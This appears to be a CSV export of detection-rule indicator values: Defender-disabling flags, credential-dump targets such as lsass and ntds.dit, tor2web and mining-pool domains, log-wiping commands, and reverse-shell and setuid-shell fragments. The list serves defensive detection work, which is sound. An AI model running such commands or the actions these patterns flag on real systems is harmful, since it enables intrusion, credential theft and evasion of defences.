:START_ID,:END_ID,:TYPE,properties
"Payload:Where-Object {$_.imagepath -notmatch ""system"" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath","Where-Object {$_.imagepath -notmatch ""system"" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath",Value,
"Payload:$a +=  \\""$($_.FullName.Replace('\\\\','/'))/\\""}else{  $a += \\""$($_.FullName.Replace('\\\\', '/'))\\"" }","$a +=  \\""$($_.FullName.Replace('\\\\','/'))/\\""}else{  $a += \\""$($_.FullName.Replace('\\\\', '/'))\\"" }",Value,
Payload:$a=@();$,$a=@();$,Value,
Payload:rundll32.exe,rundll32.exe,Value,
Payload:shell32.dll,shell32.dll,Value,
Payload:shellexec_rundll,shellexec_rundll,Value,
Payload:powershell,powershell,Value,
"Payload:(?i)&&set.*(\\{\\d\\}){2,}\\\\""\\s+?-f.*&&.*cmd.*/c","(?i)&&set.*(\\{\\d\\}){2,}\\\\""\\s+?-f.*&&.*cmd.*/c",Value,
Payload:Get-ADDBAccount,Get-ADDBAccount,Value,
Payload:BootKey ,BootKey ,Value,
Payload:DatabasePath ,DatabasePath ,Value,
"Payload:cmd.{0,5}(?:/c|/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+""","cmd.{0,5}(?:/c|/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+""",Value,
ContextInfo:Compress-Archive -Path*-DestinationPath $env:TEMP,Compress-Archive -Path*-DestinationPath $env:TEMP,Value,
ContextInfo:Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\,Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\,Value,
ContextInfo:Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\,Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\,Value,
Payload:ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {,ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {,Value,
Data:Compress-Archive -Path*-DestinationPath $env:TEMP,Compress-Archive -Path*-DestinationPath $env:TEMP,Value,
Data:Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\,Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\,Value,
Data:Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\,Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\,Value,
Data:Get-WmiObject,Get-WmiObject,Value,
Data:Win32_ShadowCopy,Win32_ShadowCopy,Value,
Data:Delete(),Delete(),Value,
Data:Remove-WmiObject,Remove-WmiObject,Value,
Data:Set-MpPreference,Set-MpPreference,Value,
Data:-dbaf $true,-dbaf $true,Value,
Data:-dbaf 1,-dbaf 1,Value,
Data:-dbm $true,-dbm $true,Value,
Data:-dbm 1,-dbm 1,Value,
Data:-dips $true,-dips $true,Value,
Data:-dips 1,-dips 1,Value,
Data:-DisableArchiveScanning $true,-DisableArchiveScanning $true,Value,
Data:-DisableArchiveScanning 1,-DisableArchiveScanning 1,Value,
Data:-DisableBehaviorMonitoring $true,-DisableBehaviorMonitoring $true,Value,
Data:-DisableBehaviorMonitoring 1,-DisableBehaviorMonitoring 1,Value,
Data:-DisableBlockAtFirstSeen $true,-DisableBlockAtFirstSeen $true,Value,
Data:-DisableBlockAtFirstSeen 1,-DisableBlockAtFirstSeen 1,Value,
Data:-DisableCatchupFullScan $true,-DisableCatchupFullScan $true,Value,
Data:-DisableCatchupFullScan 1,-DisableCatchupFullScan 1,Value,
Data:-DisableCatchupQuickScan $true,-DisableCatchupQuickScan $true,Value,
Data:-DisableCatchupQuickScan 1,-DisableCatchupQuickScan 1,Value,
Data:-DisableIntrusionPreventionSystem $true,-DisableIntrusionPreventionSystem $true,Value,
Data:-DisableIntrusionPreventionSystem 1,-DisableIntrusionPreventionSystem 1,Value,
Data:-DisableIOAVProtection $true,-DisableIOAVProtection $true,Value,
Data:-DisableIOAVProtection 1,-DisableIOAVProtection 1,Value,
Data:-DisableRealtimeMonitoring $true,-DisableRealtimeMonitoring $true,Value,
Data:-DisableRealtimeMonitoring 1,-DisableRealtimeMonitoring 1,Value,
Data:-DisableRemovableDriveScanning $true,-DisableRemovableDriveScanning $true,Value,
Data:-DisableRemovableDriveScanning 1,-DisableRemovableDriveScanning 1,Value,
Data:-DisableScanningMappedNetworkDrivesForFullScan $true,-DisableScanningMappedNetworkDrivesForFullScan $true,Value,
Data:-DisableScanningMappedNetworkDrivesForFullScan 1,-DisableScanningMappedNetworkDrivesForFullScan 1,Value,
Data:-DisableScanningNetworkFiles $true,-DisableScanningNetworkFiles $true,Value,
Data:-DisableScanningNetworkFiles 1,-DisableScanningNetworkFiles 1,Value,
Data:-DisableScriptScanning $true,-DisableScriptScanning $true,Value,
Data:-DisableScriptScanning 1,-DisableScriptScanning 1,Value,
Data:-MAPSReporting $false,-MAPSReporting $false,Value,
Data:-MAPSReporting 0,-MAPSReporting 0,Value,
Data:-drdsc $true,-drdsc $true,Value,
Data:-drdsc 1,-drdsc 1,Value,
Data:-drtm $true,-drtm $true,Value,
Data:-drtm 1,-drtm 1,Value,
Data:-dscrptsc $true,-dscrptsc $true,Value,
Data:-dscrptsc 1,-dscrptsc 1,Value,
Data:-dsmndf $true,-dsmndf $true,Value,
Data:-dsmndf 1,-dsmndf 1,Value,
Data:-dsnf $true,-dsnf $true,Value,
Data:-dsnf 1,-dsnf 1,Value,
Data:-dss $true,-dss $true,Value,
Data:-dss 1,-dss 1,Value,
Data:HighThreatDefaultAction Allow,HighThreatDefaultAction Allow,Value,
Data:htdefac Allow,htdefac Allow,Value,
Data:LowThreatDefaultAction Allow,LowThreatDefaultAction Allow,Value,
Data:ltdefac Allow,ltdefac Allow,Value,
Data:ModerateThreatDefaultAction Allow,ModerateThreatDefaultAction Allow,Value,
Data:mtdefac Allow,mtdefac Allow,Value,
Data:SevereThreatDefaultAction Allow,SevereThreatDefaultAction Allow,Value,
Data:stdefac Allow,stdefac Allow,Value,
Data:powercat ,powercat ,Value,
Data:powercat.ps1,powercat.ps1,Value,
Data:EngineVersion=2.,EngineVersion=2.,Value,
Data:HostVersion=2.,HostVersion=2.,Value,
Data:Net.WebClient,Net.WebClient,Value,
Data:.DownloadFile(,.DownloadFile(,Value,
Data:.DownloadString(,.DownloadString(,Value,
Data:ProviderName=WSMan,ProviderName=WSMan,Value,
Data:HostApplication=powershell,HostApplication=powershell,Value,
Data:HostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell,HostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell,Value,
Data:HostApplication=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell,HostApplication=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell,Value,
Data:HostApplication=C:/Windows/System32/WindowsPowerShell/v1.0/powershell,HostApplication=C:/Windows/System32/WindowsPowerShell/v1.0/powershell,Value,
Data:HostApplication=C:/Windows/SysWOW64/WindowsPowerShell/v1.0/powershell,HostApplication=C:/Windows/SysWOW64/WindowsPowerShell/v1.0/powershell,Value,
Data:HostId=[a-zA-Z0-9-]{36}\\s+EngineVersion=,HostId=[a-zA-Z0-9-]{36}\\s+EngineVersion=,Value,
Data:powershell,powershell,Value,
Data:nslookup,nslookup,Value,
Data:[1],[1],Value,
Data:-q=txt http,-q=txt http,Value,
Data:-querytype=txt http,-querytype=txt http,Value,
Data:-type=txt http,-type=txt http,Value,
Data:EngineVersion=2.,EngineVersion=2.,Value,
Data:EngineVersion=4.,EngineVersion=4.,Value,
Data:EngineVersion=5.,EngineVersion=5.,Value,
Data:HostVersion=3.,HostVersion=3.,Value,
Data:ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {,ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {,Value,
WholeLog:username,username,Value,
WholeLog:aaa,aaa,Value,
WholeLog:erase,erase,Value,
WholeLog:delete,delete,Value,
WholeLog:format,format,Value,
WholeLog:crypto pki export,crypto pki export,Value,
WholeLog:crypto pki import,crypto pki import,Value,
WholeLog:crypto pki trustpoint,crypto pki trustpoint,Value,
WholeLog:clear logging,clear logging,Value,
WholeLog:clear archive,clear archive,Value,
WholeLog:monitor capture point,monitor capture point,Value,
WholeLog:set span,set span,Value,
WholeLog:set rspan,set rspan,Value,
WholeLog:ip http server,ip http server,Value,
WholeLog:ip https server,ip https server,Value,
WholeLog:kron policy-list,kron policy-list,Value,
WholeLog:kron occurrence,kron occurrence,Value,
WholeLog:policy-list,policy-list,Value,
WholeLog:access-list,access-list,Value,
WholeLog:ip access-group,ip access-group,Value,
WholeLog:archive maximum,archive maximum,Value,
WholeLog:ntp server,ntp server,Value,
WholeLog:shutdown,shutdown,Value,
WholeLog:config-register 0x2100,config-register 0x2100,Value,
WholeLog:config-register 0x2142,config-register 0x2142,Value,
WholeLog:no logging,no logging,Value,
WholeLog:no aaa new-model,no aaa new-model,Value,
WholeLog:show history,show history,Value,
WholeLog:show history all,show history all,Value,
WholeLog:show logging,show logging,Value,
path:\\\\\\*\\IPC$,\\\\\\*\\IPC$,Value,
name:atsvc,atsvc,Value,
request_type:TGS,TGS,Value,
cipher:rc4-hmac,rc4-hmac,Value,
path:\\,\\,Value,
path:ADMIN$,ADMIN$,Value,
name:SYSTEM32\\,SYSTEM32\\,Value,
name:.tmp,.tmp,Value,
certificate.serial:8BB00EE,8BB00EE,Value,
path:IPC$,IPC$,Value,
name:spoolss,spoolss,Value,
path:\\\\\\\\\\*\\\\IPC$,\\\\\\\\\\*\\\\IPC$,Value,
status_code:200,200,Value,
uri:/wsman,/wsman,Value,
method:POST,POST,Value,
name:\\mimidrv,\\mimidrv,Value,
name:\\lsass,\\lsass,Value,
name:\\windows\\minidump\\,\\windows\\minidump\\,Value,
name:\\hiberfil,\\hiberfil,Value,
name:\\sqldmpr,\\sqldmpr,Value,
name:\\sam,\\sam,Value,
name:\\ntds.dit,\\ntds.dit,Value,
name:\\security,\\security,Value,
query:UWhRCA,UWhRCA,Value,
query:BAAAA,BAAAA,Value,
query:tor2web.org,tor2web.org,Value,
query:tor2web.com,tor2web.com,Value,
query:torlink.co,torlink.co,Value,
query:onion.to,onion.to,Value,
query:onion.ink,onion.ink,Value,
query:onion.cab,onion.cab,Value,
query:onion.nu,onion.nu,Value,
query:onion.link,onion.link,Value,
query:onion.it,onion.it,Value,
query:onion.city,onion.city,Value,
query:onion.direct,onion.direct,Value,
query:onion.top,onion.top,Value,
query:onion.casa,onion.casa,Value,
query:onion.plus,onion.plus,Value,
query:onion.rip,onion.rip,Value,
query:onion.dog,onion.dog,Value,
query:tor2web.fi,tor2web.fi,Value,
query:tor2web.blutmagie.de,tor2web.blutmagie.de,Value,
query:onion.sh,onion.sh,Value,
query:onion.lu,onion.lu,Value,
query:onion.pet,onion.pet,Value,
query:t2w.pw,t2w.pw,Value,
query:tor2web.ae.org,tor2web.ae.org,Value,
query:tor2web.io,tor2web.io,Value,
query:tor2web.xyz,tor2web.xyz,Value,
query:onion.lt,onion.lt,Value,
query:s1.tor-gateways.de,s1.tor-gateways.de,Value,
query:s2.tor-gateways.de,s2.tor-gateways.de,Value,
query:s3.tor-gateways.de,s3.tor-gateways.de,Value,
query:s4.tor-gateways.de,s4.tor-gateways.de,Value,
query:s5.tor-gateways.de,s5.tor-gateways.de,Value,
query:hiddenservice.net,hiddenservice.net,Value,
host:.bid,.bid,Value,
host:.by,.by,Value,
host:.cf,.cf,Value,
host:.click,.click,Value,
host:.cm,.cm,Value,
host:.ga,.ga,Value,
host:.gq,.gq,Value,
host:.ir,.ir,Value,
host:.kp,.kp,Value,
host:.loan,.loan,Value,
host:.ml,.ml,Value,
host:.mm,.mm,Value,
host:.party,.party,Value,
host:.pw,.pw,Value,
host:.ru,.ru,Value,
host:.su,.su,Value,
host:.sy,.sy,Value,
host:.tk,.tk,Value,
host:.top,.top,Value,
host:.tv,.tv,Value,
host:.ve,.ve,Value,
host:.work,.work,Value,
host:.xyz,.xyz,Value,
uri:.bat,.bat,Value,
uri:.bin,.bin,Value,
uri:.cmd,.cmd,Value,
uri:.cpl,.cpl,Value,
uri:.dll,.dll,Value,
uri:.dylib,.dylib,Value,
uri:.elf,.elf,Value,
uri:.exe,.exe,Value,
uri:.hta,.hta,Value,
uri:.iso,.iso,Value,
uri:.jar,.jar,Value,
uri:.js,.js,Value,
uri:.lnk,.lnk,Value,
uri:.msi,.msi,Value,
uri:.pif,.pif,Value,
uri:.ps1,.ps1,Value,
uri:.py,.py,Value,
uri:.reg,.reg,Value,
uri:.scr,.scr,Value,
uri:.sh,.sh,Value,
uri:.so,.so,Value,
uri:.vbs,.vbs,Value,
uri:.wsf,.wsf,Value,
resp_mime_types:application/vnd.microsoft.portable-executable,application/vnd.microsoft.portable-executable,Value,
resp_mime_types:application/x-bat,application/x-bat,Value,
resp_mime_types:application/x-dosexec,application/x-dosexec,Value,
resp_mime_types:application/x-elf,application/x-elf,Value,
resp_mime_types:application/x-iso9660-image,application/x-iso9660-image,Value,
resp_mime_types:application/x-java-archive,application/x-java-archive,Value,
resp_mime_types:application/x-ms-shortcut,application/x-ms-shortcut,Value,
resp_mime_types:application/x-msdos-program,application/x-msdos-program,Value,
resp_mime_types:application/x-msdownload,application/x-msdownload,Value,
resp_mime_types:application/x-python-code,application/x-python-code,Value,
resp_mime_types:application/x-sh,application/x-sh,Value,
operation:RpcAsyncInstallPrinterDriverFromPackage,RpcAsyncInstallPrinterDriverFromPackage,Value,
operation:RpcAsyncAddPrintProcessor,RpcAsyncAddPrintProcessor,Value,
operation:RpcAddPrintProcessor,RpcAddPrintProcessor,Value,
operation:RpcAddPrinterDriverEx,RpcAddPrinterDriverEx,Value,
operation:RpcAddPrinterDriver,RpcAddPrinterDriver,Value,
operation:RpcAsyncAddPrinterDriver,RpcAsyncAddPrinterDriver,Value,
name:.pst,.pst,Value,
name:.ost,.ost,Value,
name:.msg,.msg,Value,
name:.nst,.nst,Value,
name:.oab,.oab,Value,
name:.edb,.edb,Value,
name:.nsf,.nsf,Value,
name:.bak,.bak,Value,
name:.dmp,.dmp,Value,
name:.kirbi,.kirbi,Value,
name:\\groups.xml,\\groups.xml,Value,
name:.rdp,.rdp,Value,
path:\\\\,\\\\,Value,
path:\\IPC$,\\IPC$,Value,
name:-stdin,-stdin,Value,
name:-stdout,-stdout,Value,
name:-stderr,-stderr,Value,
name:PSEXESVC,PSEXESVC,Value,
operation:efs,efs,Value,
id.orig_h:::1/128,::1/128,Value,
id.orig_h:10.0.0.0/8,10.0.0.0/8,Value,
id.orig_h:127.0.0.0/8,127.0.0.0/8,Value,
id.orig_h:172.16.0.0/12,172.16.0.0/12,Value,
id.orig_h:192.168.0.0/16,192.168.0.0/16,Value,
id.orig_h:169.254.0.0/16,169.254.0.0/16,Value,
id.orig_h:2620:83:8000::/48,2620:83:8000::/48,Value,
id.orig_h:fc00::/7,fc00::/7,Value,
id.orig_h:fe80::/10,fe80::/10,Value,
query:.interact.sh,.interact.sh,Value,
query:.oast.pro,.oast.pro,Value,
query:.oast.live,.oast.live,Value,
query:.oast.site,.oast.site,Value,
query:.oast.online,.oast.online,Value,
query:.oast.fun,.oast.fun,Value,
query:.oast.me,.oast.me,Value,
query:.burpcollaborator.net,.burpcollaborator.net,Value,
query:.oastify.com,.oastify.com,Value,
query:.canarytokens.com,.canarytokens.com,Value,
query:.requestbin.net,.requestbin.net,Value,
query:.dnslog.cn,.dnslog.cn,Value,
query:pool.minexmr.com,pool.minexmr.com,Value,
query:fr.minexmr.com,fr.minexmr.com,Value,
query:de.minexmr.com,de.minexmr.com,Value,
query:sg.minexmr.com,sg.minexmr.com,Value,
query:ca.minexmr.com,ca.minexmr.com,Value,
query:us-west.minexmr.com,us-west.minexmr.com,Value,
query:pool.supportxmr.com,pool.supportxmr.com,Value,
query:mine.c3pool.com,mine.c3pool.com,Value,
query:xmr-eu1.nanopool.org,xmr-eu1.nanopool.org,Value,
query:xmr-eu2.nanopool.org,xmr-eu2.nanopool.org,Value,
query:xmr-us-east1.nanopool.org,xmr-us-east1.nanopool.org,Value,
query:xmr-us-west1.nanopool.org,xmr-us-west1.nanopool.org,Value,
query:xmr-asia1.nanopool.org,xmr-asia1.nanopool.org,Value,
query:xmr-jp1.nanopool.org,xmr-jp1.nanopool.org,Value,
query:xmr-au1.nanopool.org,xmr-au1.nanopool.org,Value,
query:xmr.2miners.com,xmr.2miners.com,Value,
query:xmr.hashcity.org,xmr.hashcity.org,Value,
query:xmr.f2pool.com,xmr.f2pool.com,Value,
query:xmrpool.eu,xmrpool.eu,Value,
query:pool.hashvault.pro,pool.hashvault.pro,Value,
query:api.telegram.org,api.telegram.org,Value,
record_type:TXT,TXT,Value,
answer:IEX,IEX,Value,
answer:Invoke-Expression,Invoke-Expression,Value,
answer:cmd.exe,cmd.exe,Value,
query:aaa.stage.,aaa.stage.,Value,
query:post.1,post.1,Value,
query:.stage.123456.,.stage.123456.,Value,
query:==.,==.,Value,
query:ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.testing,ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.testing,Value,
query:ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.test,ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.test,Value,
query:ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com,ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com,Value,
query:ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf.com,ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf.com,Value,
query:iuqssfsodp9ifjaposdfjhgosurijfaewrwergwea.com,iuqssfsodp9ifjaposdfjhgosurijfaewrwergwea.com,Value,
type:SYSCALL,SYSCALL,Value,
syscall:syslog,syslog,Value,
a0:4,4,Value,
a0:5,5,Value,
a0:6,6,Value,
type:EXECVE,EXECVE,Value,
key:susp_activity,susp_activity,Value,
type:PATH,PATH,Value,
name:/sysrq,/sysrq,Value,
name:/sysctl.conf,/sysctl.conf,Value,
name:/sysrq-trigger,/sysrq-trigger,Value,
type:EXECVE,EXECVE,Value,
a0:chattr,chattr,Value,
a1:-i,-i,Value,
type:PATH,PATH,Value,
name:/var/run/haldrund.pid,/var/run/haldrund.pid,Value,
name:/var/run/xinetd.lock,/var/run/xinetd.lock,Value,
name:/var/run/kdevrund.pid,/var/run/kdevrund.pid,Value,
type:EXECVE,EXECVE,Value,
a0:iptables,iptables,Value,
a1:DROP,DROP,Value,
type:EXECVE,EXECVE,Value,
a0:firewall-cmd,firewall-cmd,Value,
a1:remove,remove,Value,
type:EXECVE,EXECVE,Value,
a0:ufw,ufw,Value,
a1:delete,delete,Value,
type:SYSCALL,SYSCALL,Value,
comm:insmod,insmod,Value,
exe:/usr/bin/kmod,/usr/bin/kmod,Value,
type:PATH,PATH,Value,
name:/etc/ld.so.preload,/etc/ld.so.preload,Value,
type:EXECVE,EXECVE,Value,
WholeLog:grep,grep,Value,
WholeLog:password,password,Value,
type:SYSCALL,SYSCALL,Value,
exe:/useradd,/useradd,Value,
type:ADD_USER,ADD_USER,Value,
type:PATH,PATH,Value,
name:/etc/audit/*,/etc/audit/*,Value,
name:/etc/libaudit.conf,/etc/libaudit.conf,Value,
name:/etc/audisp/*,/etc/audisp/*,Value,
type:PATH,PATH,Value,
name:/etc/pam.d/system-auth,/etc/pam.d/system-auth,Value,
name:/etc/pam.d/password-auth,/etc/pam.d/password-auth,Value,
type:TTY,TTY,Value,
type:USER_TTY,USER_TTY,Value,
type:PATH,PATH,Value,
name:/etc/shells,/etc/shells,Value,
name:/etc/profile,/etc/profile,Value,
name:/etc/profile.d/*,/etc/profile.d/*,Value,
name:/etc/bash.bashrc,/etc/bash.bashrc,Value,
name:/etc/bashrc,/etc/bashrc,Value,
name:/etc/zsh/zprofile,/etc/zsh/zprofile,Value,
name:/etc/zsh/zshrc,/etc/zsh/zshrc,Value,
name:/etc/zsh/zlogin,/etc/zsh/zlogin,Value,
name:/etc/zsh/zlogout,/etc/zsh/zlogout,Value,
name:/etc/csh.cshrc,/etc/csh.cshrc,Value,
name:/etc/csh.login,/etc/csh.login,Value,
name:/root/.bashrc,/root/.bashrc,Value,
name:/root/.bash_profile,/root/.bash_profile,Value,
name:/root/.profile,/root/.profile,Value,
name:/root/.zshrc,/root/.zshrc,Value,
name:/root/.zprofile,/root/.zprofile,Value,
name:/home/*/.bashrc,/home/*/.bashrc,Value,
name:/home/*/.zshrc,/home/*/.zshrc,Value,
name:/home/*/.bash_profile,/home/*/.bash_profile,Value,
name:/home/*/.zprofile,/home/*/.zprofile,Value,
name:/home/*/.profile,/home/*/.profile,Value,
name:/home/*/.bash_login,/home/*/.bash_login,Value,
name:/home/*/.bash_logout,/home/*/.bash_logout,Value,
name:/home/*/.zlogin,/home/*/.zlogin,Value,
name:/home/*/.zlogout,/home/*/.zlogout,Value,
type:SYSCALL,SYSCALL,Value,
syscall:execve,execve,Value,
syscall:execveat,execveat,Value,
euid:33,33,Value,
type:execve,execve,Value,
a0:cp,cp,Value,
a1:/bin/sh,/bin/sh,Value,
a2:/crond,/crond,Value,
type:PATH,PATH,Value,
name:/etc/syslog.conf,/etc/syslog.conf,Value,
name:/etc/rsyslog.conf,/etc/rsyslog.conf,Value,
name:/etc/syslog-ng/syslog-ng.conf,/etc/syslog-ng/syslog-ng.conf,Value,
WholeLog:--to-ports 42,--to-ports 42,Value,
WholeLog:--to-ports 43,--to-ports 43,Value,
type:EXECVE,EXECVE,Value,
a0:wget,wget,Value,
a1:--post-file=,--post-file=,Value,
type:SYSCALL,SYSCALL,Value,
exe:/tmp/,/tmp/,Value,
exe:/var/www/,/var/www/,Value,
exe:/home/*/public_html/,/home/*/public_html/,Value,
exe:/usr/local/apache2/,/usr/local/apache2/,Value,
exe:/usr/local/httpd/,/usr/local/httpd/,Value,
exe:/var/apache/,/var/apache/,Value,
exe:/srv/www/,/srv/www/,Value,
exe:/home/httpd/html/,/home/httpd/html/,Value,
exe:/srv/http/,/srv/http/,Value,
exe:/usr/share/nginx/html/,/usr/share/nginx/html/,Value,
exe:/var/lib/pgsql/data/,/var/lib/pgsql/data/,Value,
exe:/usr/local/mysql/data/,/usr/local/mysql/data/,Value,
exe:/var/lib/mysql/,/var/lib/mysql/,Value,
exe:/var/vsftpd/,/var/vsftpd/,Value,
exe:/etc/bind/,/etc/bind/,Value,
exe:/var/named/,/var/named/,Value,
type:SERVICE_STOP,SERVICE_STOP,Value,
unit:firewalld,firewalld,Value,
unit:iptables,iptables,Value,
unit:ufw,ufw,Value,
DestinationHostname:tunnel.us.ngrok.com,tunnel.us.ngrok.com,Value,
DestinationHostname:tunnel.eu.ngrok.com,tunnel.eu.ngrok.com,Value,
DestinationHostname:tunnel.ap.ngrok.com,tunnel.ap.ngrok.com,Value,
DestinationHostname:tunnel.au.ngrok.com,tunnel.au.ngrok.com,Value,
DestinationHostname:tunnel.sa.ngrok.com,tunnel.sa.ngrok.com,Value,
DestinationHostname:tunnel.jp.ngrok.com,tunnel.jp.ngrok.com,Value,
DestinationHostname:tunnel.in.ngrok.com,tunnel.in.ngrok.com,Value,
DestinationHostname:pool.minexmr.com,pool.minexmr.com,Value,
DestinationHostname:fr.minexmr.com,fr.minexmr.com,Value,
DestinationHostname:de.minexmr.com,de.minexmr.com,Value,
DestinationHostname:sg.minexmr.com,sg.minexmr.com,Value,
DestinationHostname:ca.minexmr.com,ca.minexmr.com,Value,
DestinationHostname:us-west.minexmr.com,us-west.minexmr.com,Value,
DestinationHostname:pool.supportxmr.com,pool.supportxmr.com,Value,
DestinationHostname:mine.c3pool.com,mine.c3pool.com,Value,
DestinationHostname:xmr-eu1.nanopool.org,xmr-eu1.nanopool.org,Value,
DestinationHostname:xmr-eu2.nanopool.org,xmr-eu2.nanopool.org,Value,
DestinationHostname:xmr-us-east1.nanopool.org,xmr-us-east1.nanopool.org,Value,
DestinationHostname:xmr-us-west1.nanopool.org,xmr-us-west1.nanopool.org,Value,
DestinationHostname:xmr-asia1.nanopool.org,xmr-asia1.nanopool.org,Value,
DestinationHostname:xmr-jp1.nanopool.org,xmr-jp1.nanopool.org,Value,
DestinationHostname:xmr-au1.nanopool.org,xmr-au1.nanopool.org,Value,
DestinationHostname:xmr.2miners.com,xmr.2miners.com,Value,
DestinationHostname:xmr.hashcity.org,xmr.hashcity.org,Value,
DestinationHostname:xmr.f2pool.com,xmr.f2pool.com,Value,
DestinationHostname:xmrpool.eu,xmrpool.eu,Value,
DestinationHostname:pool.hashvault.pro,pool.hashvault.pro,Value,
DestinationHostname:moneroocean.stream,moneroocean.stream,Value,
DestinationHostname:monerocean.stream,monerocean.stream,Value,
DestinationHostname:.localto.net,.localto.net,Value,
DestinationHostname:.localtonet.com,.localtonet.com,Value,
Initiated:true,true,Value,
Initiated:true,true,Value,
DestinationPort:888,888,Value,
DestinationPort:999,999,Value,
DestinationPort:2200,2200,Value,
DestinationPort:2222,2222,Value,
DestinationPort:4000,4000,Value,
DestinationPort:4444,4444,Value,
DestinationPort:6789,6789,Value,
DestinationPort:8531,8531,Value,
DestinationPort:50501,50501,Value,
DestinationPort:51820,51820,Value,
DestinationIp:127.0.0.0/8,127.0.0.0/8,Value,
DestinationIp:10.0.0.0/8,10.0.0.0/8,Value,
DestinationIp:172.16.0.0/12,172.16.0.0/12,Value,
DestinationIp:192.168.0.0/16,192.168.0.0/16,Value,
DestinationIp:169.254.0.0/16,169.254.0.0/16,Value,
DestinationIp:::1/128,::1/128,Value,
DestinationIp:fe80::/10,fe80::/10,Value,
DestinationIp:fc00::/7,fc00::/7,Value,
Image:/bin/bash,/bin/bash,Value,
DestinationIp:127.0.0.1,127.0.0.1,Value,
DestinationIp:0.0.0.0,0.0.0.0,Value,
WholeLog:networkd-dispatcher,networkd-dispatcher,Value,
WholeLog:Error handling notification for interface,Error handling notification for interface,Value,
WholeLog:../../,../../,Value,
WholeLog:chown root*chmod 4777 ,chown root*chmod 4777 ,Value,
WholeLog:cp /bin/sh .;chown,cp /bin/sh .;chown,Value,
WholeLog:chmod 4777 /tmp/.scsi/dev/bin/gsh,chmod 4777 /tmp/.scsi/dev/bin/gsh,Value,
WholeLog:chown root:root /tmp/.scsi/dev/bin/,chown root:root /tmp/.scsi/dev/bin/,Value,
WholeLog:chown root:root x;,chown root:root x;,Value,
WholeLog:/bin/telnet locip locport < /dev/console | /bin/sh,/bin/telnet locip locport < /dev/console | /bin/sh,Value,
WholeLog:/tmp/ratload,/tmp/ratload,Value,
WholeLog:ewok -t ,ewok -t ,Value,
WholeLog:xspy -display ,xspy -display ,Value,
WholeLog:cat > /dev/tcp/127.0.0.1/80 <<END,cat > /dev/tcp/127.0.0.1/80 <<END,Value,
WholeLog:rm -f /current/tmp/ftshell.latest,rm -f /current/tmp/ftshell.latest,Value,
WholeLog:ghost_* -v ,ghost_* -v ,Value,
WholeLog: --wipe > /dev/null, --wipe > /dev/null,Value,
WholeLog:ping -c 2 *; grep * /proc/net/arp >/tmp/gx,ping -c 2 *; grep * /proc/net/arp >/tmp/gx,Value,
WholeLog:iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;,iptables * OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;,Value,
WholeLog:> /var/log/audit/audit.log; rm -f .,> /var/log/audit/audit.log; rm -f .,Value,
WholeLog:cp /var/log/audit/audit.log .tmp,cp /var/log/audit/audit.log .tmp,Value,
WholeLog:sh >/dev/tcp/* <&1 2>&1,sh >/dev/tcp/* <&1 2>&1,Value,
WholeLog:ncat -vv -l -p * <,ncat -vv -l -p * <,Value,
WholeLog:nc -vv -l -p * <,nc -vv -l -p * <,Value,
